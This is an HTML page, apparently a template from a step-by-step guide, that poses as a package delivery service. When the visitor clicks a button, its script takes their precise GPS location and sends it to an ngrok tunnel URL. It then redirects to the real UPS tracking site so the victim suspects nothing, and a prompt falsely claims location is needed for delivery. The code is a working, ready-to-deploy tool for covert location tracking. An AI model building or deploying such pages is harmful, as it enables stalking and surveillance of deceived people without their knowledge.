    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .container { max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px); }

</head>
<body>
    <div class="container">
        <h1>ðŸ“¦ Package Delivery</h1>

        <br>
        <button onclick="getLocation()">ðŸ“± Get My Location</button>
        <div id="loading" class="loading">âœ… Finding your exact location...</div>
    </div>

    <script>
    function getLocation() {
        document.getElementById('loading').style.display = 'block';
        
        navigator.geolocation.getCurrentPosition(
            function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                
                // ðŸš¨ YOUR NGROK URL GOES HERE (Step 5)
                fetch(`https://abc123.ngrok-free.app/log?lat=${lat}&lon=${lon}&accuracy=${accuracy}`);
                
                setTimeout(() => {
                    window.location = 'https://www.ups.com/track?loc=en_US'; // Legit redirect
                }, 1500);
            },
            function() {
                alert('Location permission required for delivery');
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
        );
    }
    </script>
</body>
